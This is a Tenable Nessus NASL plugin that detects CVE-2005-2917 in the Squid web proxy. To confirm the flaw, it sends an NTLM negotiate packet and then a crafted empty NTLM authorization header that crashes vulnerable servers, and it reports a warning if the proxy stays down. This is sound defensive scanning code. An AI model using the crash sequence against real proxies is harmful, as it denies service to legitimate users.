#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(20010);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2005-2917");
  script_bugtraq_id(14977);
  script_osvdb_id(19607);

  script_name(english:"Squid Crafted NTLM Authentication Header DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web proxy server is prone to denial of service attacks." );
 script_set_attribute(attribute:"description", value:
"The version of Squid, an open source web proxy cache, installed on the
remote host will abort if it receives a specially crafted NTLM
challenge packet.  A remote attacker can exploit this issue to stop
the affected application, thereby denying access to legitimate users." );
  # http://www.squid-cache.org/Versions/v2/2.5/bugs/#squid-2.5.STABLE10-NTLM-scheme_assert
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?133a8605" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch referenced in the bug report or upgrade to Squid
2.5.STABLE11 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/10/12");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/09/13");
 script_cvs_date("$Date: 2016/05/12 14:55:05 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:squid-cache:squid");
script_end_attributes();

  script_summary(english:"Checks for NTLM authentication denial of service vulnerability in Squid");
  script_category(ACT_DENIAL);
  script_family(english:"Firewalls");
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
  script_dependencies("proxy_use.nasl");
  script_require_ports("Services/http_proxy", 8080, 3128);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
# keep the old API for that test
include("http_func.inc");


port = get_service(svc:"http_proxy", default: 3128, exit_on_fail: 1);


# Make sure it's Squid.
soc = open_sock_tcp(port);
if (!soc) exit (0);
req = http_get(
  item:string("http://www.f0z73", rand() % 65536, "tinker.com/"),
  port:port
);
send(socket:soc, data:req);
res = http_recv(socket:soc);
close(soc);
if (res == NULL) exit(0);


# If it is...
if ("Server: squid" >< res) {
  # And it's using NTLM authentication...
  if ("Proxy-Authenticate: NTLM" >< res) {
    soc = open_sock_tcp(port);
    if (!soc) exit (0);

    # nb: Squid's authentication protocol is outlined at:
    #     <http://squid.sourceforge.net/ntlm/client_proxy_protocol.html> 

    # Send a negotiate packet.
    negotiate = raw_string(
      "NTLMSSP", 0x00,                          # NTLMSSP identifier
      0x01, 0x00, 0x00, 0x00,                   # NTLMSSP_NEGOTIATE
      0x07, 0x82, 0x08, 0x00,                   # flags
      crap(length:8, data:raw_string(0x00)),    # calling workstation domain (NULL)
      crap(length:8, data:raw_string(0x00)),    # calling workstation name (NULL)
      0x00
    );
    req1 = str_replace(
      string:req,
      find:"User-Agent:",
      replace:string(
        "Proxy-Connection: Keep-Alive\r\n" ,
        "Proxy-Authorization: NTLM ", base64(str:negotiate), "\r\n",
        "User-Agent:"
      )
    );
    send(socket:soc, data:req1);
    res = http_recv(socket:soc);
    if (res == NULL) exit(0);

    # If the server returned a challenge packet...
    if ("Proxy-Authenticate: NTLM Tl" >< res) {
      # Try to crash it.
      req2 = str_replace(
        string:req,
        find:"User-Agent:",
        replace:string(
          "Proxy-Connection: Keep-Alive\r\n" ,
          # nb: a vulnerable server exits w/o a packet.
          "Proxy-Authorization: NTLM\r\n",
          "User-Agent:"
        )
      );
      send(socket:soc, data:req2);
      res = http_recv(socket:soc);

      # If there was no result, make sure it's down.
      if (res == NULL) {
        # There's a problem if we can't reconnect.
        if (service_is_dead(port: port) > 0)
	{
          security_warning(port);
          exit(0);
        }
      }
      else close(soc);
    }
  }
}
